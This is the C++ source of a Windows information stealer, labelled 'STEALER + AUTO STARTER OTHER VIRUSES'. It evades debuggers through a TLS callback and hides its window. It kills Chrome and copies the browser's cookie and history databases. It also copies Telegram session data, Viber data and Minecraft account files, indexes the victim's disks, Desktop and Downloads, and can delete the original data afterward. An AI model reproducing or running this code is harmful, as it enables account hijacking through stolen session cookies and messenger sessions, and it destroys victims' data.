//STEALER + AUTO STARTER OTHER VIRUSES
//BY EGOR BE LIKE
//v.1.0

#include "Global.h"           // GLOBAL VARIABLES
#include "Config.h"           // CONFIG
#include "Indexing.h"         // FOR WORK WITH INDEXING
#include "PCInfo.h"           // FOR WORK WITH PC INFO
#include "IO.h"               // FOR DEBUGGING
#include "Processes.h"        // FOR WORK WITH PROCESSES

void NTAPI tls_callback(PVOID DllHandle, DWORD dwReason, PVOID)
{
    if ((dwReason == DLL_THREAD_ATTACH || dwReason == DLL_PROCESS_ATTACH) && IsDebuggerPresent()) { exit(STATUS_DLL_INIT_FAILED); }
}

__declspec(thread) int tlsFlag = 1;

#ifdef _WIN64
#pragma comment (linker, "/INCLUDE:_tls_used")  // See p. 1 below
#pragma comment (linker, "/INCLUDE:tls_callback_func")  // See p. 3 below
#else
#pragma comment (linker, "/INCLUDE:__tls_used")  // See p. 1 below
#pragma comment (linker, "/INCLUDE:_tls_callback_func")  // See p. 3 below
#endif

// Explained in p. 3 below
#ifdef _WIN64
#pragma const_seg(".CRT$XLF")
EXTERN_C const
#else
#pragma data_seg(".CRT$XLF")
EXTERN_C
#endif
PIMAGE_TLS_CALLBACK tls_callback_func = tls_callback;
#ifdef _WIN64
#pragma const_seg()
#else
#pragma data_seg()
#endif //_WIN64

DWORD WINAPI ThreadProc(CONST LPVOID lpParam)
{
    ExitThread(0);
}

// Read the history database
void history(fs::directory_entry p) {
    resetTemp;
    temp = wcscpy(temp, (p.path().wstring() + L"\\History").c_str());
    try {
        if (fs::exists(temp)) {
            cout(L"Steal History...");
            cout(L"Path = " << temp);
            fs::copy(temp, getabspathincurrdir((L"tmp\\" + profile + L"-history.db").c_str()), fs::copy_options::overwrite_existing);
        }
        else return;
    }
    catch (fs::filesystem_error err) {
        cout(err.what());
        return;
    }
    resetTemp;
}

void steal(fs::directory_entry p) {
    resetTemp;
    temp = wcscpy(temp, (p.path().wstring() + L"\\Network\\Cookies").c_str());
    try {
        if (fs::exists(temp)) {
            cout(L"Steal Cookies...");
            cout(L"Path = " << temp);
            fs::copy(temp, getabspathincurrdir((L"tmp\\" + profile + L"-cookie.db").c_str()), fs::copy_options::overwrite_existing);
        }
        else return;
    }
    catch (fs::filesystem_error err) {
        cout(err.what());
        return;
    }
    resetTemp;
}

int wmain(int** argc, wchar_t* argv[])
{
    if (checkSelf(fs::path(argv[0]).filename().c_str()).size() > 1) { cout(L"Processes: " << checkSelf(fs::path(argv[0]).filename().c_str()).size());  return 0; }

    ifDebug({
        _setmode(_fileno(stdout), 0x20000); //0x20000 is the same as _O_U16TEXT
        _setmode(_fileno(stdin), 0x20000);
        _setmode(_fileno(stderr), 0x20000);
        //wcout.imbue(locale("en_US.utf-8"));
    })
    log_file.imbue(locale(".utf-8"));

    if (PINGREQUIRED && system("ping -n 1 -w 500 google.com > nul") != 0) { cout(L"No internet"); return 0; }

    ifNDebug(if (ShowWindowAsync(GetConsoleWindow(), SW_HIDE) != FALSE) return -1);

    cout(boolalpha);

    CreateDirectoryW(getabspathincurrdir(L"tmp").c_str(), NULL);

	//   Getting Chrome directory
    GetEnvironmentVariableW(L"LOCALAPPDATA", chromedir, MAX_PATH);
    chromedir = wcscat(chromedir, L"\\Google\\Chrome\\User Data\\");

    cout(L"Chrome path = " << chromedir);
    cout(L"Is exists = " << (fs::exists(chromedir) ? L"true" : L"false") << L"\n");
    // ! Getting Chrome directory

	//   Getting self directory
    self = wcscpy(self, getabspathincurrdir().c_str());

    cout(L"Self path = " << self);
    cout(L"Is exists = " << (fs::exists(self) ? L"true" : L"false") << L"\n");
	// ! Getting self directory
    
	//   Indexing disks
    cout(L"Indexing disks...");

    if (INDEXDISKS) {
        open(wcscpy(temp, getabspathincurrdir(L"tmp\\disks.txt").c_str()));
        cout(L"File path = " << temp);
        cout(L"Is exists = " << (fs::exists(temp) ? L"true" : L"false"));

        if (file.is_open() && file.good()) for (fs::path p : getdisks()) file << p.wstring().c_str() << L"\n";
        file.close();

        printFile(temp);
    }
	newline;
	// ! Indexing disks

	//   Indexing PC info
	resetTemp;

	cout(L"Indexing PC info...");

    if (INDEXPC) {
        open(wcscpy(temp, getabspathincurrdir(L"tmp\\pcinfo.txt").c_str()));
        cout(L"File path = " << temp);
        cout(L"Is exists = " << (fs::exists(temp) ? L"true" : L"false"));

        if (file.is_open() && file.good()) {
            PCINFO pc = get_pcinfo();

            file << "MOTHERBOARD:\n * " << isna(pc.mb.vendor) << "\n * " << isna(pc.mb.product) << "\n";

            file << L"CPU:\n * " << isna(pc.cpu.brand) << L"\n * " << pc.cpu.threads << L"/" << pc.cpu.cores
                << L" cores/threads\n * " << (pc.cpu.is64bit ? L"64-bit" : L"32-bit") << L" (program)\n";

            file << L"MEM:\n * " << pc.mem.used << L"/" << pc.mem.total << L" GB used/total = " << pc.mem.percent << L"%\n" << pc.mem.count_plates << L" PLATES MAX:";

            for (size_t i = 0; i < pc.mem.count_plates; i++)
            {
                if (pc.mem.plates[i].memory) file << L"\n * " << isna(pc.mem.plates[i].dimm) << L" | " << pc.mem.plates[i].memory
                    << L" GB | " << isna(pc.mem.plates[i].ddr) << L" | " << pc.mem.plates[i].speed
                    << L" MGz | " << isna(pc.mem.plates[i].product);
                else file << L"\n * " << isna(pc.mem.plates[i].dimm) << L" | N/A";
            }

            if (0 >= pc.mem.count_plates) file << L"\nN/A";
        }
        file.close();

        printFile(temp);
    }
    newline;
	// ! Indexing PC info
    
	//   Indexing downloaded files
    resetTemp;

	cout("Indexing downloaded files...");

    if (INDEXDOWNLOADS) {
        open(wcscpy(temp, getabspathincurrdir(L"tmp\\downloads.txt").c_str()));

        cout(L"File path = " << temp);
        cout(L"Is exists = " << (fs::exists(temp) ? L"true" : L"false"));

        vector<fs::path> buff;

        GetEnvironmentVariableW(L"USERPROFILE", downloads, MAX_PATH);
        downloads = wcscat(downloads, L"\\Downloads\\");

        index(buff, downloads);
        if (buff.empty()) file << downloads << L" isn't exist";
        for (fs::path p : buff) if (!is_cache(p)) file << p.wstring().c_str() << L"\n";
        file.close();

        printFile(temp);
    }
    newline;
    // ! Indexing downloaded files

    //   Indexing desktop files
    resetTemp;

    cout(L"Indexing desktop files...");

    if (INDEXDESKTOP) {
        open(wcscpy(temp, getabspathincurrdir(L"tmp\\desktop.txt").c_str()));

        cout(L"File path = " << temp);
        cout(L"Is exists = " << (fs::exists(temp) ? L"true" : L"false"));

        vector<fs::path> buff;

        GetEnvironmentVariableW(L"USERPROFILE", desktop, MAX_PATH);
        desktop = wcscat(desktop, L"\\Desktop\\");

        index(buff, desktop);
		if (buff.empty()) file << desktop << L" isn't exist";
        for (fs::path p : buff) if (!is_cache(p)) file << p.wstring().c_str() << L"\n";
        file.close();

        printFile(temp);
    }
    newline;
    // ! Indexing desktop files

    //   Indexing desktop files
    resetTemp;

    cout(L"Indexing desktop files...");

    if (INDEXDESKTOP) {
        open(wcscpy(temp, getabspathincurrdir(L"tmp\\desktop.txt").c_str()));

        cout(L"File path = " << temp);
        cout(L"Is exists = " << (fs::exists(temp) ? L"true" : L"false"));

        vector<fs::path> buff;

        GetEnvironmentVariableW(L"USERPROFILE", desktop, MAX_PATH);
        desktop = wcscat(desktop, L"\\Desktop\\");

        index(buff, desktop);
        if (buff.empty()) file << desktop << L" isn't exist";
        for (fs::path p : buff) if (!is_cache(p)) file << p.wstring().c_str() << L"\n";
        file.close();

        printFile(temp);
    }
    newline;
    // ! Indexing desktop files

    //   Close browser
    resetTemp;

    cout(L"Closing browser...");
    auto processes = checkSelf(L"chrome.exe");
	if (CLOSECHROME && !processes.empty()) {
        DWORD result = closeSelf(L"chrome.exe");
		cout(L"Code: " << result);
        if (result) {
            int cmdres = cmdClose("chrome.exe");
            cout(L"CMD code: " << cmdres);
        }
        Sleep(1000);
    }
    else cout(L"Closing isn't needed: CLOSECHROME = " << CLOSECHROME << L"; processes = " << processes.size());

    newline;
    // ! Close browser
    
    //   Read History and Cookies
	resetTemp;

    cout(L"Reading History and Cookies...");
    if (checkSelf(L"chrome.exe").empty()) {
        for (auto& p : fs::directory_iterator{ chromedir }) {
            profile = p.path().wstring().substr(
                p.path().wstring().find(chromedir) + wcslen(chromedir),
                p.path().wstring().size() - wcslen(chromedir)
            );
            acout(L"Profile = " << profile);
            if (INDEXHISTORY) history(p);
            if (STEALCOOKIE) steal(p);
        }
    }
    else cout(L"Chrome isn't closed!");
	newline;
    // ! Read History

    //   Copy TDATA
	resetTemp;

    cout(L"Copy tdata...");
    if (COPYTDATA) {
        cout(L"Default Telegram");
        GetEnvironmentVariableW(L"APPDATA", tdir, MAX_PATH);
        tdir = wcscat(tdir, L"\\Telegram Desktop\\");
        cout(L"TDir: " << tdir);
        try {
            if (fs::exists(tdir)) {
                tdata(tdir);
                if (DELORIGTDATA) fs::remove_all(tdir);
            }
            else cout(L"TDir isn't exists");
        }
        catch (fs::filesystem_error& e) {
            cout(L"Error: " << e.what());
        }
        resetTemp;
        cout(L"Telegram from registry");
        HKEY reg;
        vector<unsigned char> data;
        data.resize(MAX_PATH);
        size_t spos = wstring::npos, epos = wstring::npos;
        LSTATUS first = ERROR_SUCCESS, last = ERROR_SUCCESS;
        LPWSTR first_ = new WCHAR[MAX_PATH], last_ = new WCHAR[MAX_PATH];
        DWORD len = MAX_PATH;
        DWORD type = REG_SZ;
        if ((first = RegOpenKeyExW(HKEY_CLASSES_ROOT, L"tg\\shell\\open\\command", NULL, KEY_QUERY_VALUE, (PHKEY)&reg)) == ERROR_SUCCESS) {
            if ((last = RegQueryValueExW(reg, L"", NULL, &type, &data[0], &len)) == ERROR_SUCCESS) {
                string command;
                for (auto& d : data) { if ((unsigned short)d != 0) { command += d; } }
                for (auto& disk : getdisks()) {
                    if ((spos = command.find_first_of(disk.string())) != string::npos) {
                        break;
                    }
                }
                if (spos != string::npos && (epos = command.find_last_of(".exe") - 1) != string::npos - 1) {
                    fs::path exepath = fs::path(command.substr(spos - 1, (epos - spos) + 3)).parent_path();
                    cout(exepath.wstring());
                    tdata(exepath.wstring() + L"\\");
                }
                else {
                    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)first, NULL, NULL, first_, MAX_PATH, NULL);
                    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)last, NULL, NULL, last_, MAX_PATH, NULL);
                    cout(L"Cannot get path: " << first_ << L" (" << first << L"); " << last_ << L" (" << last << L"); " << spos << L"; " << epos << L";");
                    cout(fs::path(command).wstring());
                }
            }
            else {
                FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)first, NULL, NULL, first_, MAX_PATH, NULL);
                FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)last, NULL, NULL, last_, MAX_PATH, NULL);
                cout(L"Cannot get registry: " << first_ << L" (" << first << L"); " << last_ << L" (" << last << L");");
            }
            RegCloseKey(reg);
        }
        else {
            FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, (LPCVOID)first, NULL, NULL, first_, MAX_PATH, NULL);
            cout(L"Cannot open registry: " << first_ << L" (" << first << L")");
        }
    }
    newline;
    // ! Copy TDATA

    //   Copy viber
    resetTemp;

    cout(L"Copy viber...");
    if (COPYVIBER) {
        try {
            GetEnvironmentVariableW(L"APPDATA", viber, MAX_PATH);
            viber = wcscat(viber, L"\\ViberPC\\");
            cout(L"Viber: " << viber);
            if (fs::exists(viber)) {
                fs::copy(viber, getabspathincurrdir(L"tmp\\viber\\"), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
                if (DELORIGVIBER) fs::remove_all(viber);
            }
        }
        catch (fs::filesystem_error& e) {
            cout(L"Error: " << e.what());
        }
    }
    newline;
    // ! Copy viber

    //   Copy minecraft
    resetTemp;

    cout(L"Copy minecraft...");
    if (COPYMINECRAFT) {
        try {
            GetEnvironmentVariableW(L"APPDATA", minecraft, MAX_PATH);
            minecraft = wcscat(minecraft, L"\\.minecraft\\");
            cout(L"Minecraft: " << minecraft);
            if (fs::exists(minecraft)) {
                CreateDirectoryW(getabspathincurrdir(L"tmp\\minecraft\\").c_str(), NULL);
                fs::copy(wstring(minecraft) + L"command_history.txt", getabspathincurrdir(L"tmp\\minecraft\\command_history.txt").c_str(), fs::copy_options::overwrite_existing);
                fs::copy(wstring(minecraft) + L"servers.dat", getabspathincurrdir(L"tmp\\minecraft\\servers.dat").c_str(), fs::copy_options::overwrite_existing);
                fs::copy(wstring(minecraft) + L"servers.dat_old", getabspathincurrdir(L"tmp\\minecraft\\servers.dat_old").c_str(), fs::copy_options::overwrite_existing);
                fs::copy(wstring(minecraft) + L"TlauncherProfiles.json", getabspathincurrdir(L"tmp\\minecraft\\TlauncherProfiles.json").c_str(), fs::copy_options::overwrite_existing);
                fs::copy(wstring(minecraft) + L"usercache.json", getabspathincurrdir(L"tmp\\minecraft\\usercache.json").c_str(), fs::copy_options::overwrite_existing);
                fs::copy(wstring(minecraft) + L"usernamecache.json", getabspathincurrdir(L"tmp\\minecraft\\usernamecache.json").c_str(), fs::copy_options::overwrite_existing);
                fs::copy(wstring(minecraft) + L"worlds.json", getabspathincurrdir(L"tmp\\minecraft\\worlds.json").c_str(), fs::copy_options::overwrite_existing);
                fs::copy(wstring(minecraft) + L"baritone\\settings.txt", getabspathincurrdir(L"tmp\\minecraft\\baritone.settings.txt").c_str(), fs::copy_options::overwrite_existing);
                fs::copy(wstring(minecraft) + L"Impact\\config\\", getabspathincurrdir(L"tmp\\minecraft\\Impact.config\\").c_str(), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
                fs::copy(wstring(minecraft) + L"Impact\\presets\\", getabspathincurrdir(L"tmp\\minecraft\\Impact.config2\\").c_str(), fs::copy_options::recursive | fs::copy_options::overwrite_existing);
                if (DELORIGMINECRAFT) {
                    fs::remove(wstring(minecraft) + L"command_history.txt");
                    fs::remove(wstring(minecraft) + L"servers.dat");
                    fs::remove(wstring(minecraft) + L"servers.dat_old");
                    fs::remove(wstring(minecraft) + L"TlauncherProfiles.json");
                    fs::remove(wstring(minecraft) + L"usercache.json");
                    fs::remove(wstring(minecraft) + L"usernamecache.json");
                    fs::remove(wstring(minecraft) + L"worlds.json");
                    fs::remove(wstring(minecraft) + L"baritone\\settings.txt");
                    fs::remove(wstring(minecraft) + L"Impact\\config\\");
                    fs::remove(wstring(minecraft) + L"Impact\\presets\\");
                }
            }
        }
        catch (fs::filesystem_error& e) {
            cout(L"Error: " << e.what());
        }
    }
    newline;
    // ! Copy minecraft

    cout(L"Work is complteted! Press any key to exit...");
    ifDebug(getwchar());
}